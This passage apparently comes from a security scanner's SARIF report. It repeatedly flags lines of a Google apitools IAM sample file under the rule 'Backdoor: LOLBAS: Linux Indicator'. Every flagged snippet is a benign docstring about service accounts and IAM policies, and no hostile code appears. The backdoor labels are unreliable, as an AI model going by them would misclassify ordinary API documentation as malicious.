                      "text": "  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n  private key of these key-pairs, and Google retains ONLY the public key.\n  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n",
                      "markdown": "`  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n  private key of these key-pairs, and Google retains ONLY the public key.\n  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 754,
                  "startColumn": 42,
                  "endLine": 754,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\n\nclass ServiceAccountKey(_messages.Message):\n  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n",
                    "rendered": {
                      "text": "\n\nclass ServiceAccountKey(_messages.Message):\n  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n",
                      "markdown": "`\n\nclass ServiceAccountKey(_messages.Message):\n  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 754,
                  "startColumn": 18,
                  "endLine": 754,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\nclass ServiceAccountKey(_messages.Message):\n  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n",
                    "rendered": {
                      "text": "\n\nclass ServiceAccountKey(_messages.Message):\n  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n",
                      "markdown": "`\n\nclass ServiceAccountKey(_messages.Message):\n  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 740,
                  "startColumn": 57,
                  "endLine": 740,
                  "endColumn": 66,
                  "snippet": {
                    "text": "      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n      account.\n    uniqueId: @OutputOnly The unique and stable id of the service account.\n  \"\"\"\n\n  description = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n      account.\n    uniqueId: @OutputOnly The unique and stable id of the service account.\n  \"\"\"\n\n  description = _messages.StringField(1)\n",
                      "markdown": "`      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n      account.\n    uniqueId: @OutputOnly The unique and stable id of the service account.\n  \"\"\"\n\n  description = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 738,
                  "startColumn": 62,
                  "endLine": 739,
                  "snippet": {
                    "text": "    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n      account.\n    uniqueId: @OutputOnly The unique and stable id of the service account.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n      account.\n    uniqueId: @OutputOnly The unique and stable id of the service account.\n  \"\"\"\n\n",
                      "markdown": "`    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n      account.\n    uniqueId: @OutputOnly The unique and stable id of the service account.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 735,
                  "startColumn": 61,
                  "endLine": 735,
                  "endColumn": 70,
                  "snippet": {
                    "text": "      the `account` value can be the `email` address or the `unique_id` of the\n      service account.  In responses the resource name will always be in the\n      format `projects/{project}/serviceAccounts/{email}`.\n    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n",
                    "rendered": {
                      "text": "      the `account` value can be the `email` address or the `unique_id` of the\n      service account.  In responses the resource name will always be in the\n      format `projects/{project}/serviceAccounts/{email}`.\n    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n",
                      "markdown": "`      the `account` value can be the `email` address or the `unique_id` of the\n      service account.  In responses the resource name will always be in the\n      format `projects/{project}/serviceAccounts/{email}`.\n    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n      three legged OAuth2 (3LO) flows to access the data of Google users.\n    projectId: @OutputOnly The id of the project that owns the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 733,
                  "startColumn": 5,
                  "endLine": 733,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n      wildcard for the project will infer the project from the `account` and\n      the `account` value can be the `email` address or the `unique_id` of the\n      service account.  In responses the resource name will always be in the\n      format `projects/{project}/serviceAccounts/{email}`.\n    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n",
                    "rendered": {
                      "text": "      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n      wildcard for the project will infer the project from the `account` and\n      the `account` value can be the `email` address or the `unique_id` of the\n      service account.  In responses the resource name will always be in the\n      format `projects/{project}/serviceAccounts/{email}`.\n    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n",
                      "markdown": "`      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n      wildcard for the project will infer the project from the `account` and\n      the `account` value can be the `email` address or the `unique_id` of the\n      service account.  In responses the resource name will always be in the\n      format `projects/{project}/serviceAccounts/{email}`.\n    oauth2ClientId: @OutputOnly. The OAuth2 client id for the service account.\n      This is used in conjunction with the OAuth2 clientconfig API to make\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 729,
                  "startColumn": 34,
                  "endLine": 729,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n      wildcard for the project will infer the project from the `account` and\n      the `account` value can be the `email` address or the `unique_id` of the\n",
                    "rendered": {
                      "text": "      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n      wildcard for the project will infer the project from the `account` and\n      the `account` value can be the `email` address or the `unique_id` of the\n",
                      "markdown": "`      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n      wildcard for the project will infer the project from the `account` and\n      the `account` value can be the `email` address or the `unique_id` of the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 727,
                  "startColumn": 47,
                  "endLine": 727,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n",
                    "rendered": {
                      "text": "      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n",
                      "markdown": "`      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Requests using `-` as a\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 725,
                  "startColumn": 62,
                  "endLine": 726,
                  "snippet": {
                    "text": "  Fields:\n    description: Optional. A user-specified opaque description of the service\n      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n",
                    "rendered": {
                      "text": "  Fields:\n    description: Optional. A user-specified opaque description of the service\n      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n",
                      "markdown": "`  Fields:\n    description: Optional. A user-specified opaque description of the service\n      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n    etag: Used to perform a consistent read-modify-write.\n    name: The resource name of the service account in the following format:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 723,
                  "startColumn": 69,
                  "endLine": 724,
                  "snippet": {
                    "text": "  be the `email` address or the `unique_id` of the service account.\n\n  Fields:\n    description: Optional. A user-specified opaque description of the service\n      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n",
                    "rendered": {
                      "text": "  be the `email` address or the `unique_id` of the service account.\n\n  Fields:\n    description: Optional. A user-specified opaque description of the service\n      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n",
                      "markdown": "`  be the `email` address or the `unique_id` of the service account.\n\n  Fields:\n    description: Optional. A user-specified opaque description of the service\n      account.\n    displayName: Optional. A user-specified description of the service\n      account.  Must be fewer than 100 UTF-8 bytes.\n    email: @OutputOnly The email address of the service account.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 720,
                  "startColumn": 50,
                  "endLine": 720,
                  "endColumn": 59,
                  "snippet": {
                    "text": "  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n  be the `email` address or the `unique_id` of the service account.\n\n  Fields:\n    description: Optional. A user-specified opaque description of the service\n",
                    "rendered": {
                      "text": "  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n  be the `email` address or the `unique_id` of the service account.\n\n  Fields:\n    description: Optional. A user-specified opaque description of the service\n",
                      "markdown": "`  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n  be the `email` address or the `unique_id` of the service account.\n\n  Fields:\n    description: Optional. A user-specified opaque description of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 717,
                  "startColumn": 32,
                  "endLine": 717,
                  "endColumn": 41,
                  "snippet": {
                    "text": "  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n  be the `email` address or the `unique_id` of the service account.\n",
                    "rendered": {
                      "text": "  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n  be the `email` address or the `unique_id` of the service account.\n",
                      "markdown": "`  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n  be the `email` address or the `unique_id` of the service account.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 716,
                  "startColumn": 14,
                  "endLine": 716,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n",
                    "rendered": {
                      "text": "  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n",
                      "markdown": "`  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n  `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard for\n  the project will infer the project from the account. The `account` value can\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 714,
                  "startColumn": 3,
                  "endLine": 714,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\nclass ServiceAccount(_messages.Message):\n  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n",
                    "rendered": {
                      "text": "\nclass ServiceAccount(_messages.Message):\n  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n",
                      "markdown": "`\nclass ServiceAccount(_messages.Message):\n  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n  other methods can identify the service account using the format\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 713,
                  "startColumn": 7,
                  "endLine": 713,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n\nclass ServiceAccount(_messages.Message):\n  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n",
                    "rendered": {
                      "text": "\n\nclass ServiceAccount(_messages.Message):\n  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n",
                      "markdown": "`\n\nclass ServiceAccount(_messages.Message):\n  r\"\"\"A service account in the Identity and Access Management API.  To create\n  a service account, specify the `project_id` and the `account_id` for the\n  account.  The `account_id` is unique within the project, and is used to\n  generate the service account email address and a stable `unique_id`.  All\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 558,
                  "startColumn": 14,
                  "endLine": 558,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  specify access control policies for Cloud Platform resources.   A `Policy`\n  consists of a list of `bindings`. A `Binding` binds a list of `members` to a\n  `role`, where the members can be user accounts, Google groups, Google\n  domains, and service accounts. A `role` is a named list of permissions\n  defined by IAM.  **Example**      {       \"bindings\": [         {\n  \"role\": \"roles/owner\",           \"members\": [\n  \"user:mike@example.com\",             \"group:admins@example.com\",\n",
                    "rendered": {
                      "text": "  specify access control policies for Cloud Platform resources.   A `Policy`\n  consists of a list of `bindings`. A `Binding` binds a list of `members` to a\n  `role`, where the members can be user accounts, Google groups, Google\n  domains, and service accounts. A `role` is a named list of permissions\n  defined by IAM.  **Example**      {       \"bindings\": [         {\n  \"role\": \"roles/owner\",           \"members\": [\n  \"user:mike@example.com\",             \"group:admins@example.com\",\n",
                      "markdown": "`  specify access control policies for Cloud Platform resources.   A `Policy`\n  consists of a list of `bindings`. A `Binding` binds a list of `members` to a\n  `role`, where the members can be user accounts, Google groups, Google\n  domains, and service accounts. A `role` is a named list of permissions\n  defined by IAM.  **Example**      {       \"bindings\": [         {\n  \"role\": \"roles/owner\",           \"members\": [\n  \"user:mike@example.com\",             \"group:admins@example.com\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 538,
                  "startColumn": 58,
                  "endLine": 538,
                  "endColumn": 64,
                  "snippet": {
                    "text": "  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n  field: \"iam_principal\" }   ==> increment counter\n  /iam/policy/backend_debug_access_count\n  {iam_principal=[value of IAMContext.principal]}  At this time we do not\n  support: * multiple field names (though this may be supported in the future)\n  * decrementing the counter * incrementing it by anything other than 1\n\n",
                    "rendered": {
                      "text": "  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n  field: \"iam_principal\" }   ==> increment counter\n  /iam/policy/backend_debug_access_count\n  {iam_principal=[value of IAMContext.principal]}  At this time we do not\n  support: * multiple field names (though this may be supported in the future)\n  * decrementing the counter * incrementing it by anything other than 1\n\n",
                      "markdown": "`  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n  field: \"iam_principal\" }   ==> increment counter\n  /iam/policy/backend_debug_access_count\n  {iam_principal=[value of IAMContext.principal]}  At this time we do not\n  support: * multiple field names (though this may be supported in the future)\n  * decrementing the counter * incrementing it by anything other than 1\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 517,
                  "startColumn": 34,
                  "endLine": 517,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  r\"\"\"The service account list response.\n\n  Fields:\n    accounts: The list of matching service accounts.\n    nextPageToken: To retrieve the next page of results, set\n      ListServiceAccountsRequest.page_token to this value.\n  \"\"\"\n",
                    "rendered": {
                      "text": "  r\"\"\"The service account list response.\n\n  Fields:\n    accounts: The list of matching service accounts.\n    nextPageToken: To retrieve the next page of results, set\n      ListServiceAccountsRequest.page_token to this value.\n  \"\"\"\n",
                      "markdown": "`  r\"\"\"The service account list response.\n\n  Fields:\n    accounts: The list of matching service accounts.\n    nextPageToken: To retrieve the next page of results, set\n      ListServiceAccountsRequest.page_token to this value.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 514,
                  "startColumn": 9,
                  "endLine": 514,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass ListServiceAccountsResponse(_messages.Message):\n  r\"\"\"The service account list response.\n\n  Fields:\n    accounts: The list of matching service accounts.\n",
                    "rendered": {
                      "text": "\n\nclass ListServiceAccountsResponse(_messages.Message):\n  r\"\"\"The service account list response.\n\n  Fields:\n    accounts: The list of matching service accounts.\n",
                      "markdown": "`\n\nclass ListServiceAccountsResponse(_messages.Message):\n  r\"\"\"The service account list response.\n\n  Fields:\n    accounts: The list of matching service accounts.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
